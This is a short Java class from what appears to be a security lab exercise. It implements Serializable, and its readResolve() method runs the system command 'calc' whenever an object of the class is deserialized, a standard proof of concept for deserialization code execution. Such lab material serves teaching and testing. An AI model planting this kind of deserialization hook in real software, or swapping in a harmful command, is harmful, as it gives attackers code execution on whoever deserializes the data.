package lab5;

import java.io.Serializable;

public class Test implements Serializable {
    private String test;

    public Object readResolve() throws Exception{
        Runtime.getRuntime().exec("calc");
        return null;
    }
}
